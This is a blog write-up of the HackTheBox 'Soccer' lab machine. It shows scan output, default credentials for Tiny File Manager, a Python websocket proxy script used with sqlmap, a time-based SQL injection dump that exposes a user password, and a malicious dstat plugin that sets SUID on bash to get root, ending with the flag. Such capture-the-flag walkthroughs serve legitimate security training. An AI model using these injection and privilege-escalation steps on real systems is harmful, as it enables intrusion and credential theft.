---
layout:     post
title:      "HackTheBox - Soccer"
subtitle:   "Write-Up"
date:       2023-06-10
author:     "D4mianwayne"
tags:    ["dstat, sqlmap, upstream_proxy, websocket"]
img:  "/img/htb.png"
categories: ["HackTheBox"]
layout: "simple"

---



Writeup for HackTheBox's Soccer.

<!-- more -->

Starting off with the `nmap` scan:

```jsx
# Nmap 7.92 scan initiated Tue Apr 18 16:38:39 2023 as: nmap -sV -sC -A -Pn -p 22,80 -o nmap_ports -vv -Pn 10.10.11.194
Nmap scan report for 10.10.11.194 (10.10.11.194)
Host is up, received user-set (0.085s latency).
Scanned at 2023-04-18 16:38:40 UTC for 9s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 18 16:38:49 2023 -- 1 IP address (1 host up) scanned in 9.96 seconds
```

We have port 80 and 22 open, `nmap` identified that the HTTP port is redirecting to the `soccer.htb` , performing a directory busting on it revealed an endpoint `/tiny` 

```jsx
❯ gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\
> 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/04/18 16:41:03 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

It is a H3K File Manager, checking for any exploit for it revealed that we have PHP File Upload RCE:

[https://github.com/febinrev/tinyfilemanager-2.4.3-exploit](https://github.com/febinrev/tinyfilemanager-2.4.3-exploit)

Exploitation requires an authenticated user, default credentials worked for the application:

```jsx
admin:admin@123
```

Once uploaded, we can go the `uploads` folder and then upload a web shell and execute commands from there:

![](/img/Soccer_1b9739f8fee5449c921268c1b05aead0/Untitled.png)

Next, we can get a reverse shell from the web shell:

![](/img/Soccer_1b9739f8fee5449c921268c1b05aead0/Untitled_1.png)

The user did not have any privilege to read flags or anything, performing extensive enumeration did not reveal any credentials that could be used, checking for the running services, we had port 3000 and 9091, checking `/etc/hosts` , we can see that it has `soc-player.soccer.htb` vhost and checking the `nginx` configuration, it is the application running on port 3000.

Next up, adding the `soc-player.soccer.htb` to the `hosts` file and then registering for the new user on the website, we can see that it has ticket checking functionality, the request is made over websocket and it has following data

```jsx
{"id": "45352"}
```

Most probable attack in this case could be the SQL injection, but we cannot check it directly from burp. To tackle this, we can set up an upstream proxy and then use it for sending the payload to the websockert, following blog have a snippet which can be modified to be used:

[https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

Modified script which will be hosting apython server at 8081 acting as an upstream proxy:

```jsx
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```

Using `sqlmap` we can identify that there is a TIME based SQL Injection:

![](/img/Soccer_1b9739f8fee5449c921268c1b05aead0/Untitled_2.png)

We can dump the database using `sqlmap` :

```jsx
❯ sqlmap -u "http://localhost:8081/?id=1" -p "id"
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.5#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:32:55 /2023-04-18/

[17:32:55] [INFO] testing connection to the target URL
[17:32:55] [WARNING] turning off pre-connect mechanism because of incompatible server ('SimpleHTTP/0.6 Python/3.9.10')
[17:32:55] [INFO] testing if the target URL content is stable
[17:32:56] [INFO] target URL content is stable
[17:32:56] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[17:32:56] [INFO] testing for SQL injection on GET parameter 'id'
[17:32:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:32:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:32:59] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:33:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:33:02] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:33:04] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:33:05] [INFO] testing 'Generic inline queries'
[17:33:06] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:33:06] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                     
[17:33:08] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:33:09] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:33:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:33:22] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[17:33:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:33:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:33:37] [INFO] target URL appears to be UNION injectable with 3 columns

[17:37:06] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[17:37:06] [INFO] checking if the injection point on GET parameter 'id' is a false positive

sqlmap identified the following injection point(s) with a total of 98 HTTP(s) requests:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6120 FROM (SELECT(SLEEP(5)))ECkW)
---
[17:37:47] [INFO] the back-end DBMS is MySQL
[17:37:47] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
back-end DBMS: MySQL >= 5.0.12
[17:37:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'
[17:37:48] [WARNING] your sqlmap version is outdated

[..snip..]

[17:38:02] [INFO] testing MySQL
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[17:38:26] [INFO] confirming MySQL
[17:38:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[17:38:36] [INFO] adjusting time delay to 1 second due to good response times
[17:38:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 8.0.0
[17:38:36] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[17:38:36] [INFO] fetching current database
[17:38:36] [INFO] retrieved: soccer_db
[17:39:30] [INFO] fetching tables for database: 'soccer_db'
[17:39:30] [INFO] fetching number of tables for database 'soccer_db'
[17:39:30] [INFO] retrieved: 1
[17:39:33] [INFO] retrieved: accounts
[17:40:18] [INFO] fetching columns for table 'accounts' in database 'soccer_db'
[17:40:18] [INFO] retrieved: 4
[17:40:22] [INFO] retrieved: email
[17:40:48] [INFO] retrieved: id
[17:41:01] [INFO] retrieved: password
[17:41:48] [INFO] retrieved: username
[17:42:31] [INFO] fetching entries for table 'accounts' in database 'soccer_db'
[17:42:31] [INFO] fetching number of entries for table 'accounts' in database 'soccer_db'
[17:42:31] [INFO] retrieved: 1
[17:42:35] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)

[..snip..]

[17:43:22] [INFO] testing MySQL
[17:43:22] [INFO] confirming MySQL
[17:43:22] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 8.0.0
[17:43:22] [INFO] fetching columns for table 'accounts' in database 'soccer_db'
[17:43:22] [INFO] resumed: 4
[17:43:22] [INFO] resumed: email
[17:43:22] [INFO] resumed: id
[17:43:22] [INFO] resumed: password
[17:43:22] [INFO] resumed: username
[17:43:22] [INFO] fetching entries for table 'accounts' in database 'soccer_db'
[17:43:22] [INFO] fetching number of entries for table 'accounts' in database 'soccer_db'
[17:43:22] [INFO] resumed: 1
[17:43:22] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[17:44:11] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[17:44:22] [INFO] adjusting time delay to 1 second due to good response times
player@player.htb
[17:45:59] [INFO] retrieved: 1324
[17:46:22] [INFO] retrieved: PlayerOftheMatch
[17:48:04] [ERROR] invalid character detected. retrying..
[17:48:04] [WARNING] increasing time delay to 2 seconds
2022

Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

```jsx
player:PlayerOftheMatch2022
```

We got a user’s password i.e. `player` , next up we can directly SSH into the machine as the `player` user, checking for any SUID binaries, we can see that `doas` can be ran as SUID, checking the `doas.conf` file to see how it is configured:

```jsx
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

We can see that `dstat` can be ran as `root` using `doas` , to exploit this we can add a `dstat` plugin with specified format of any existing plugin, following blog shows how to perform the steps clearly:

<aside>
💡 In this particular case, you need to specify a class `dstat_plugin` class in the plugin script i.e. the malicious python script, in order to make it work and comply with the `dstat`

</aside>

[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/)

Just adding a `os.system` function call which will execute the payload, making the `/usr/bin/bash` as a SUID binary:

```jsx
player@soccer:/usr/local/share/dstat$ cat > dstat_xploit.py
class dstat_plugin(dstat):
    """
    Example "Hello world!" output plugin for aspiring Dstat developers.
    """

    def __init__(self):
        self.name = 'plugin title'
        self.nick = ('counter',)
        self.vars = ('text',)
        self.type = 's'
        self.width = 12
        self.scale = 0

    def extract(self):
        import os
        os.system("chmod +s /usr/bin/bash")
        self.val['text'] = 'Hello world!'
^C
player@soccer:/usr/local/share/dstat$ dstat -l
---load-avg---
 1m   5m  15m 
   0    0    0
   0    0    0
   0    0    0
   0    0    0
   0    0    0
   0    0    0
   0    0    0^C
player@soccer:/usr/local/share/dstat$ dstat --list
internal:
	aio,cpu,cpu-adv,cpu-use,cpu24,disk,disk24,disk24-old,epoch,fs,int,int24,io,ipc,load,lock,mem,mem-adv,net,page,page24,proc,raw,socket,swap,swap-old,sys,tcp,time,udp,unix,vm,vm-adv,zones
/usr/share/dstat:
	battery,battery-remain,condor-queue,cpufreq,dbus,disk-avgqu,disk-avgrq,disk-svctm,disk-tps,disk-util,disk-wait,dstat,dstat-cpu,dstat-ctxt,dstat-mem,fan,freespace,fuse,gpfs,gpfs-ops,helloworld,ib,
	innodb-buffer,innodb-io,innodb-ops,jvm-full,jvm-vm,lustre,md-status,memcache-hits,mongodb-conn,mongodb-mem,mongodb-opcount,mongodb-queue,mongodb-stats,mysql-io,mysql-keys,mysql5-cmds,mysql5-conn,mysql5-innodb,
	mysql5-innodb-basic,mysql5-innodb-extra,mysql5-io,mysql5-keys,net-packets,nfs3,nfs3-ops,nfsd3,nfsd3-ops,nfsd4-ops,nfsstat4,ntp,postfix,power,proc-count,qmail,redis,rpc,rpcd,sendmail,snmp-cpu,snmp-load,
	snmp-mem,snmp-net,snmp-net-err,snmp-sys,snooze,squid,test,thermal,top-bio,top-bio-adv,top-childwait,top-cpu,top-cpu-adv,top-cputime,top-cputime-avg,top-int,top-io,top-io-adv,top-latency,top-latency-avg,
	top-mem,top-oom,utmp,vm-cpu,vm-mem,vm-mem-adv,vmk-hba,vmk-int,vmk-nic,vz-cpu,vz-io,vz-ubc,wifi,zfs-arc,zfs-l2arc,zfs-zil
/usr/local/share/dstat:
	xploit
player@soccer:/usr/local/share/ds
```

Once executed, we can see that `/usr/bin/bash` has now became an SUID, we can spawn the `bash` in a privileged mode with `-p` and continue as root user in the machine:

![](/img/Soccer_1b9739f8fee5449c921268c1b05aead0/Untitled_3.png)

Get the flag:

```jsx
player@soccer:/usr/local/share/dstat$ ls -la /usr/bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /usr/bin/bash
player@soccer:/usr/local/share/dstat$ /usr/bin/bash -p
bash-5.0# whoami
root
bash-5.0# id
uid=1001(player) gid=1001(player) euid=0(root) egid=0(root) groups=0(root),1001(player)
bash-5.0# cd /root
bash-5.0# ls
app  root.txt  run.sql	snap
bash-5.0# cat root.txt
78e0183f20973bb59927b351bc26c4b1
```


